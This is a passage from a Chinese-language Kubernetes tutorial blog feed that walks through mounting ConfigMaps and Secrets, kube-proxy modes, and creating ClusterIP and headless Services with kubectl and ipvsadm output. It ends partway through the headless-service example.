class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">info</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">more info</span></span><br><span class="line">username:admin</span><br><span class="line">password:123456</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以看到映射已经成功，每个configmap都映射成了一个目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">key---&gt;文件     value----&gt;文件中的内容</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时如果更新configmap的内容, 容器中的值也会动态更新</span></span><br></pre></td></tr></table></figure><h3 id="8-3-2-Secret"><a href="#8-3-2-Secret" class="headerlink" title="8.3.2 Secret"></a>8.3.2 Secret</h3><p>在kubernetes中，还存在一种和ConfigMap非常类似的对象，称为Secret对象。它主要用于存储敏感信息，例如密码、秘钥、证书等等。</p><ol><li>首先使用base64对数据进行编码</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# echo -n &#x27;admin&#x27; | base64 #准备username</span><br><span class="line">YWRtaW4=</span><br><span class="line">[root@k8s-master01 ~]# echo -n &#x27;123456&#x27; | base64 #准备password</span><br><span class="line">MTIzNDU2</span><br></pre></td></tr></table></figure><ol start="2"><li>接下来编写secret.yaml，并创建Secret</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">YWRtaW4=</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">MTIzNDU2</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建secret</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f secret.yaml</span><br><span class="line">secret/secret created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看secret详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe secret secret -n dev</span><br><span class="line">Name:         secret</span><br><span class="line">Namespace:    dev</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Type:  Opaque</span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">password:  6 bytes</span><br><span class="line">username:  5 bytes</span><br></pre></td></tr></table></figure><ol start="3"><li>创建pod-secret.yaml，将上面创建的secret挂载进去：</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-secret</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">volumeMounts:</span> <span class="comment"># 将secret挂载到目录</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/secret/config</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">    <span class="attr">secret:</span></span><br><span class="line">      <span class="attr">secretName:</span> <span class="string">secret</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml</span><br><span class="line">pod/pod-secret created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev</span><br><span class="line">NAME            READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-secret      1/1     Running   0          2m28s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入容器，查看secret信息，发现已经自动解码了</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev</span><br><span class="line">/ # ls /secret/config/</span><br><span class="line">password  username</span><br><span class="line">/ # more /secret/config/username</span><br><span class="line">admin</span><br><span class="line">/ # more /secret/config/password</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><p>至此，已经实现了利用secret实现了信息的编码。</p>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 7</title>
      <link href="/2022/07/14/a099258d15af-q1jun/"/>
      <url>/2022/07/14/a099258d15af-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="7-Service详解"><a href="#7-Service详解" class="headerlink" title="7. Service详解"></a>7. Service详解</h1><h2 id="7-1-Service介绍"><a href="#7-1-Service介绍" class="headerlink" title="7.1 Service介绍"></a>7.1 Service介绍</h2><p>在kubernetes中，pod是应用程序的载体，我们可以通过pod的ip来访问应用程序，但是pod的ip地址不是固定的，这也就意味着不方便直接采用pod的ip对服务进行访问。</p><p>为了解决这个问题，kubernetes提供了Service资源，Service会对提供同一个服务的多个pod进行聚合，并且提供一个统一的入口地址。通过访问Service的入口地址就能访问到后面的pod服务。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200408194716912-1626783758946-20220719083321829.png" alt="img"></p><p>Service在很多情况下只是一个概念，真正起作用的其实是kube-proxy服务进程，每个Node节点上都运行着一个kube-proxy服务进程。当创建Service的时候会通过api-server向etcd写入创建的service的信息，而kube-proxy会基于监听的机制发现这种Service的变动，然后<strong>它会将最新的Service信息转换成对应的访问规则</strong>。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200509121254425-20220719083321872.png" alt="img"></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 10.97.97.97:80 是service提供的访问入口</span></span><br><span class="line"><span class="comment"># 当访问这个入口的时候，可以发现后面有三个pod的服务在等待调用，</span></span><br><span class="line"><span class="comment"># kube-proxy会基于rr（轮询）的策略，将请求分发到其中一个pod上去</span></span><br><span class="line"><span class="comment"># 这个规则会同时在集群内的所有节点上都生成，所以在任何一个节点上访问都可以。</span></span><br><span class="line">[root@node1 ~]<span class="comment"># ipvsadm -Ln</span></span><br><span class="line">IP Virtual Server version 1.2.1 (size=4096)</span><br><span class="line">Prot LocalAddress:Port Scheduler Flags</span><br><span class="line">  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConn</span><br><span class="line">TCP  10.97.97.97:80 rr</span><br><span class="line">  -&gt; 10.244.1.39:80               Masq   <span class="number"> 1 </span>    <span class="number"> 0 </span>         0</span><br><span class="line">  -&gt; 10.244.1.40:80               Masq   <span class="number"> 1 </span>    <span class="number"> 0 </span>         0</span><br><span class="line">  -&gt; 10.244.2.33:80               Masq   <span class="number"> 1 </span>    <span class="number"> 0 </span>         0</span><br></pre></td></tr></table></figure><p>kube-proxy目前支持三种工作模式:</p><p><strong>userspace 模式</strong></p><p>userspace模式下，kube-proxy会为每一个Service创建一个监听端口，发向Cluster IP的请求被Iptables规则重定向到kube-proxy监听的端口上，kube-proxy根据LB算法选择一个提供服务的Pod并和其建立链接，以将请求转发到Pod上。  该模式下，kube-proxy充当了一个四层负责均衡器的角色。由于kube-proxy运行在userspace中，在进行转发处理时会增加内核和用户空间之间的数据拷贝，虽然比较稳定，但是效率比较低。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200509151424280-20220719083321961.png" alt="img"></p><p><strong>iptables 模式</strong></p><p>iptables模式下，kube-proxy为service后端的每个Pod创建对应的iptables规则，直接将发向Cluster IP的请求重定向到一个Pod IP。  该模式下kube-proxy不承担四层负责均衡器的角色，只负责创建iptables规则。该模式的优点是较userspace模式效率更高，但不能提供灵活的LB策略，当后端Pod不可用时也无法进行重试。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200509152947714-20220719083322027.png" alt="img"></p><p><strong>ipvs 模式</strong></p><p>ipvs模式和iptables类似，kube-proxy监控Pod的变化并创建相应的ipvs规则。ipvs相对iptables转发效率更高。除此以外，ipvs支持更多的LB算法。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200509153731363-20220719083322089.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此模式必须安装ipvs内核模块，否则会降级为iptables</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启ipvs</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改mode: <span class="string">&quot;ipvs&quot;</span></span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system</span><br><span class="line">[root@node1 ~]# ipvsadm -Ln</span><br><span class="line">IP Virtual Server version 1.2.1 (size=4096)</span><br><span class="line">Prot LocalAddress:Port Scheduler Flags</span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">RemoteAddress:Port           Forward Weight ActiveConn InActConn</span></span><br><span class="line">TCP  10.97.97.97:80 rr</span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.39:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.40:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.2.33:80               Masq    1      0          0</span></span><br></pre></td></tr></table></figure><h2 id="7-2-Service类型"><a href="#7-2-Service类型" class="headerlink" title="7.2 Service类型"></a>7.2 Service类型</h2><p>Service的资源清单文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Service</span>  <span class="comment"># 资源类型</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>  <span class="comment"># 资源版本</span></span><br><span class="line"><span class="attr">metadata:</span> <span class="comment"># 元数据</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">service</span> <span class="comment"># 资源名称</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span> <span class="comment"># 命名空间</span></span><br><span class="line"><span class="attr">spec:</span> <span class="comment"># 描述</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 标签选择器，用于确定当前service代理哪些pod</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">type:</span> <span class="comment"># Service类型，指定service的访问方式</span></span><br><span class="line">  <span class="attr">clusterIP:</span>  <span class="comment"># 虚拟服务的ip地址</span></span><br><span class="line">  <span class="attr">sessionAffinity:</span> <span class="comment"># session亲和性，支持ClientIP、None两个选项</span></span><br><span class="line">  <span class="attr">ports:</span> <span class="comment"># 端口信息</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">TCP</span> </span><br><span class="line">      <span class="attr">port:</span> <span class="number">3017</span>  <span class="comment"># service端口</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">5003</span> <span class="comment"># pod端口</span></span><br><span class="line">      <span class="attr">nodePort:</span> <span class="number">31122</span> <span class="comment"># 主机端口</span></span><br></pre></td></tr></table></figure><ul><li>ClusterIP：默认值，它是Kubernetes系统自动分配的虚拟IP，只能在集群内部访问</li><li>NodePort：将Service通过指定的Node上的端口暴露给外部，通过此方法，就可以在集群外部访问服务</li><li>LoadBalancer：使用外接负载均衡器完成到服务的负载分发，注意此模式需要外部云环境支持</li><li>ExternalName： 把集群外部的服务引入集群内部，直接使用</li></ul><h2 id="7-3-Service使用"><a href="#7-3-Service使用" class="headerlink" title="7.3 Service使用"></a>7.3 Service使用</h2><h3 id="7-3-1-实验环境准备"><a href="#7-3-1-实验环境准备" class="headerlink" title="7.3.1 实验环境准备"></a>7.3.1 实验环境准备</h3><p>在使用service之前，首先利用Deployment创建出3个pod，注意要为pod设置<code>app=nginx-pod</code>的标签</p><p>创建deployment.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span>      </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-deployment</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span> </span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl create -f deployment.yaml</span><br><span class="line">deployment.apps/pc-deployment created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels</span><br><span class="line">NAME                             READY   STATUS     IP            NODE     LABELS</span><br><span class="line">pc-deployment-66cb59b984-8p84h   1/1     Running    10.244.1.39   node1    app=nginx-pod</span><br><span class="line">pc-deployment-66cb59b984-vx8vx   1/1     Running    10.244.2.33   node2    app=nginx-pod</span><br><span class="line">pc-deployment-66cb59b984-wnncx   1/1     Running    10.244.1.40   node1    app=nginx-pod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">为了方便后面的测试，修改下三台nginx的index.html页面（三台修改的IP地址不一致）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl <span class="built_in">exec</span> -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;10.244.1.39&quot;</span> &gt; /usr/share/nginx/html/index.html</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改完毕之后，访问测试</span></span><br><span class="line">[root@k8s-master01 ~]# curl 10.244.1.39</span><br><span class="line">10.244.1.39</span><br><span class="line">[root@k8s-master01 ~]# curl 10.244.2.33</span><br><span class="line">10.244.2.33</span><br><span class="line">[root@k8s-master01 ~]# curl 10.244.1.40</span><br><span class="line">10.244.1.40</span><br></pre></td></tr></table></figure><h3 id="7-3-2-ClusterIP类型的Service"><a href="#7-3-2-ClusterIP类型的Service" class="headerlink" title="7.3.2 ClusterIP类型的Service"></a>7.3.2 ClusterIP类型的Service</h3><p>创建service-clusterip.yaml文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">service-clusterip</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="number">10.97</span><span class="number">.97</span><span class="number">.97</span> <span class="comment"># service的ip地址，如果不写，默认会生成一个</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span>  <span class="comment"># Service端口       </span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span> <span class="comment"># pod端口</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建service</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml</span><br><span class="line">service/service-clusterip created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看service</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get svc -n dev -o wide</span><br><span class="line">NAME                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE   SELECTOR</span><br><span class="line">service-clusterip   ClusterIP   10.97.97.97   &lt;none&gt;        80/TCP    13s   app=nginx-pod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看service的详细信息</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在这里有一个Endpoints列表，里面就是当前service可以负载到的服务入口</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev</span><br><span class="line">Name:              service-clusterip</span><br><span class="line">Namespace:         dev</span><br><span class="line">Labels:            &lt;none&gt;</span><br><span class="line">Annotations:       &lt;none&gt;</span><br><span class="line">Selector:          app=nginx-pod</span><br><span class="line">Type:              ClusterIP</span><br><span class="line">IP:                10.97.97.97</span><br><span class="line">Port:              &lt;unset&gt;  80/TCP</span><br><span class="line">TargetPort:        80/TCP</span><br><span class="line">Endpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80</span><br><span class="line">Session Affinity:  None</span><br><span class="line">Events:            &lt;none&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ipvs的映射规则</span></span><br><span class="line">[root@k8s-master01 ~]# ipvsadm -Ln</span><br><span class="line">TCP  10.97.97.97:80 rr</span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.39:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.40:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.2.33:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问10.97.97.97:80观察效果</span></span><br><span class="line">[root@k8s-master01 ~]# curl 10.97.97.97:80</span><br><span class="line">10.244.2.33</span><br></pre></td></tr></table></figure><p><strong>Endpoint</strong></p><p>Endpoint是kubernetes中的一个资源对象，存储在etcd中，用来记录一个service对应的所有pod的访问地址，它是根据service配置文件中selector描述产生的。</p><p>一个Service由一组Pod组成，这些Pod通过Endpoints暴露出来，<strong>Endpoints是实现实际服务的端点集合</strong>。换句话说，service和pod之间的联系是通过endpoints实现的。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200509191917069-20220719083322137.png" alt="image-20200509191917069"></p><p><strong>负载分发策略</strong></p><p>对Service的访问被分发到了后端的Pod上去，目前kubernetes提供了两种负载分发策略：</p><ul><li><p>如果不定义，默认使用kube-proxy的策略，比如随机、轮询</p></li><li><p>基于客户端地址的会话保持模式，即来自同一个客户端发起的所有请求都会转发到固定的一个Pod上</p><p>此模式可以使在spec中添加<code>sessionAffinity:ClientIP</code>选项</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ipvs的映射规则【rr 轮询】</span></span><br><span class="line">[root@k8s-master01 ~]# ipvsadm -Ln</span><br><span class="line">TCP  10.97.97.97:80 rr</span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.39:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.40:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.2.33:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">循环访问测试</span></span><br><span class="line">[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;</span><br><span class="line">10.244.1.40</span><br><span class="line">10.244.1.39</span><br><span class="line">10.244.2.33</span><br><span class="line">10.244.1.40</span><br><span class="line">10.244.1.39</span><br><span class="line">10.244.2.33</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改分发策略----sessionAffinity:ClientIP</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ipvs规则【persistent 代表持久】</span></span><br><span class="line">[root@k8s-master01 ~]# ipvsadm -Ln</span><br><span class="line">TCP  10.97.97.97:80 rr persistent 10800</span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.39:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.1.40:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">10.244.2.33:80               Masq    1      0          0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">循环访问测试</span></span><br><span class="line">[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;</span><br><span class="line">10.244.2.33</span><br><span class="line">10.244.2.33</span><br><span class="line">10.244.2.33</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除service</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml</span><br><span class="line">service &quot;service-clusterip&quot; deleted</span><br></pre></td></tr></table></figure><h3 id="7-3-3-HeadLiness类型的Service"><a href="#7-3-3-HeadLiness类型的Service" class="headerlink" title="7.3.3 HeadLiness类型的Service"></a>7.3.3 HeadLiness类型的Service</h3><p>在某些场景中，开发人员可能不想使用Service提供的负载均衡功能，而希望自己来控制负载均衡策略，针对这种情况，kubernetes提供了HeadLiness Service，这类Service不会分配Cluster IP，如果想要访问service，只能通过service的域名进行查询。</p><p>创建service-headliness.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">service-headliness</span></span><br><span class="line">  <span class="attr">namespace:</span> <span 